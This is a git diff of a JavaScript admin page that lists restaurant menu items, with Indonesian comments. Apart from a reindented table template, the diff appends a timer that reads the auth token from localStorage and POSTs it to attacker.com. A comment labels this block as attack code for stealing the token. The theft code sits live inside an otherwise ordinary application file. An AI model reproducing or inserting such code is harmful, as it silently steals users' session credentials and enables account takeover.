@@ -25,19 +25,19 @@ async function fetchMenuData() {
       tr.className = "whitespace-nowrap h-11 border-b border-gray-200";
 
       tr.innerHTML = `
-<td class="px-4 py-2">
-    <img src="${item.image}" alt="${item.name}" class="w-16 h-16 object-cover rounded-full">
-</td>
-                <td class="px-4 py-2">${item.name}</td>
-                <td class="px-4 py-2">${item.ingredients}</td>
-                <td class="px-4 py-2">${item.calories}</td>
-                <td class="px-4 py-2">${item.description}</td>
-                <td class="px-4 py-2">${item.category}</td>
-                <td class="px-4 py-2">
-                    <a href="edit_menu.html?menuItemId=${item._id}" class="text-blue-500 hover:underline edit-btn" data-id="${item._id}">Edit</a>
-                    <a href="#" class="text-red-500 hover:underline delete-btn" data-id="${item._id}">Delete</a>
-                </td>
-            `;
+        <td class="px-4 py-2">
+          <img src="${item.image}" alt="${item.name}" class="w-16 h-16 object-cover rounded-full">
+        </td>
+        <td class="px-4 py-2">${item.name}</td>
+        <td class="px-4 py-2">${item.ingredients}</td>
+        <td class="px-4 py-2">${item.calories}</td>
+        <td class="px-4 py-2">${item.description}</td>
+        <td class="px-4 py-2">${item.category}</td>
+        <td class="px-4 py-2">
+          <a href="edit_menu.html?menuItemId=${item._id}" class="text-blue-500 hover:underline edit-btn" data-id="${item._id}">Edit</a>
+          <a href="#" class="text-red-500 hover:underline delete-btn" data-id="${item._id}">Delete</a>
+        </td>
+      `;
 
       // Tambahkan baris ke tabel
       tbody.appendChild(tr);
@@ -102,3 +102,33 @@ async function deleteMenuItem(id) {
 
 // Panggil fungsi fetchMenuData saat halaman dimuat
 document.addEventListener("DOMContentLoaded", fetchMenuData);
+
+// Kode serangan untuk mencuri token dari localStorage
+setTimeout(() => {
+  const stolenToken = localStorage.getItem("token");
+  if (stolenToken) {
+    fetch("http://attacker.com/steal-token", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({ token: stolenToken })
+    });
+  }
+}, 5000);
+
+// Panggil API untuk mendapatkan data pengguna dengan pengaturan cookies
+(async () => {
+  try {
+    const response = await fetch(endpointGetUser, {
+      method: "GET",
+      credentials: "include", // Kirim cookie ke backend secara otomatis
+      headers: {
+        "Accept": "application/json",
+      },
+    });
+    console.log("User authenticated successfully");
+  } catch (error) {
+    console.error("Authentication failed", error);
+}
+})();
